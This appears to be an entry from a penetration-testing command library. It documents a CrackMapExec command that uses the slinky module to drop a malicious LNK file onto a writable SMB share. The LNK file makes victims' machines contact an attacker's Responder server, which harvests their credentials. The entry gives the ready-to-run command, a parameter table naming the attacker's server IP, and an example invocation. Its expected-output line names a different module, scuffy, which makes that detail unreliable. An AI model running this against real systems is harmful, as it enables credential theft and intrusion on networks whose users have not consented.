---
id: c1a281db-cece-49dc-be11-3d9e5b13c990
name: crackmapexec-smb-lnk-payload
type: command
executor: bash
data: >-
  crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK
  SERVER=IP_RESPONDER
output: null
created_at: '2023-04-06T03:56:03.381607+00:00'
updated_at: '2023-04-10T20:26:21.390997+00:00'
platforms:
  - Linux
tags:
  - smb-exploitation
  - payload-deployment
verified: true
validated: true
---

# crackmapexec-smb-lnk-payload

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD -M slinky -o NAME=$_SHARE_NAME SERVER=$_RESPONDER_IP
```

## Description

Deploys an LNK payload to a writable SMB share using CrackMapExec's slinky module as an alternative to SCF for remote execution triggers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target SMB server IP | Yes |
| -u $_USERNAME | Username for auth | Yes |
| -p $_PASSWORD | Password for auth | Yes |
| -M slinky | LNK payload module | Yes |
| -o NAME=$_SHARE_NAME | Share/folder name | Yes |
| SERVER=$_RESPONDER_IP | Attacker's server IP | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.10.10.10 -u user -p pass -M slinky -o NAME=WORK SERVER=192.168.1.100
```

## Expected Output

Successful share access and file placement: "[+] scuffy executed successfully on target."

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share]]
- [[tools/CrackMapExec]]
